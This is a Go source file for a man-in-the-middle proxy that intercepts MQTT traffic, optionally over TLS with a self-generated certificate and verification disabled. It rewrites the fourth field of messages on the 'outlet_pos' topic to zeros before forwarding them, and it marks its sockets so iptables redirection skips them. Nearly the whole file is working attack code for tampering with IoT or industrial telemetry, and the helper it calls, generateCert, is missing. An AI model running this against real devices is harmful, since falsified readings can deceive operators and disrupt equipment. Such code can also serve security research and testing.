package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"syscall"
)

type mitm struct {
	c net.Conn
}

func (this *mitm) Read(p []byte) (int, error) {
	pub := make([]byte, 32*1024)

	n, err := this.c.Read(pub)
	if err != nil {
		return 0, err
	}

	targetTopic := []byte("outlet_pos")

	// 2nd byte is always len of rest of packet. Note that multiple packets may
	// end up being read as part of the same call to conn.Read.

	pos := 0

	for {
		// type bit
		tb := pos
		// size bit
		sb := pos + 1

		plen := int(pub[sb])

		// additional 2 bytes takes into account type bit and length bit
		stop := pos + plen + 2

		// additional 2 bytes takes into account type bit and length bit
		packet := pub[pos+2 : stop]

		if pub[tb] != 48 || !bytes.Contains(packet, targetTopic) {
			copy(p[pos:], pub[pos:stop])
		} else {
			fmt.Printf("ORIGINAL: %s\n", string(packet))

			topicLen := binary.BigEndian.Uint16(packet[0:2])
			// 2 bytes for topic length, 2 bytes for message identifier after topic
			startBit := 2 + topicLen + 2
			payload := packet[startBit:]

			tokens := strings.Split(string(payload), ", ")

			tokens[3] = strings.Repeat("0", len(tokens[3]))

			payload = []byte(strings.Join(tokens, ", "))

			copy(packet[startBit:], payload)

			fmt.Printf("MODIFIED: %s\n\n", string(packet))

			p[tb] = pub[tb]
			p[sb] = pub[sb]

			copy(p[pos+2:], packet)
		}

		pos = stop

		if pos >= n {
			break
		}
	}

	return n, nil
}

func main() {
	if len(os.Args) < 2 {
		panic("must provide listener config argument")
	}

	args := strings.Split(os.Args[1], ":")

	if len(args) != 4 {
		panic("invalid listener config provided")
	}

	var (
		local  = fmt.Sprintf("%s:%s", args[0], args[1])
		remote = fmt.Sprintf("%s:%s", args[2], args[3])

		l   net.Listener
		err error
	)

	if len(os.Args) > 2 && os.Args[2] == "tls" {
		c, k, err := generateCert()
		if err != nil {
			panic(err)
		}

		cert, err := tls.X509KeyPair(c, k)
		if err != nil {
			panic(err)
		}

		config := tls.Config{Certificates: []tls.Certificate{cert}}

		l, err = tls.Listen("tcp", local, &config)
		if err != nil {
			panic(err)
		}
	} else {
		l, err = net.Listen("tcp", local)
		if err != nil {
			panic(err)
		}
	}

	fmt.Printf("listening on %s\n", local)

	for {
		c, err := l.Accept()
		if err != nil {
			panic(err)
		}

		go handle(c, remote)
	}
}

func handle(c net.Conn, remote string) {
	defer c.Close()

	fmt.Printf("client at %v connected\n", c.RemoteAddr())

	dialer := net.Dialer{}
	dialer.Control = func(_, _ string, c syscall.RawConn) error {
		return c.Control(func(fd uintptr) {
			// Mark outbound connection created by redirector so we can avoid
			// redirecting its connection via iptables.
			if err := syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_MARK, 45); err != nil {
				panic(err)
			}

			fmt.Println("outbound connection marked as 45")
		})
	}

	var (
		r   net.Conn
		err error
	)

	if len(os.Args) > 2 && os.Args[2] == "tls" {
		cert, err := tls.LoadX509KeyPair(os.Args[3], os.Args[4])
		if err != nil {
			panic(err)
		}

		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		r, err = tls.DialWithDialer(&dialer, "tcp", remote, &config)
		if err != nil {
			panic(err)
		}
	} else {
		r, err = dialer.Dial("tcp", remote)
		if err != nil {
			panic(err)
		}
	}

	defer r.Close()

	fmt.Printf("connected to %s\n", remote)

	go func() {
		m := &mitm{c}
		io.Copy(r, m)
	}()

	io.Copy(c, r)
}
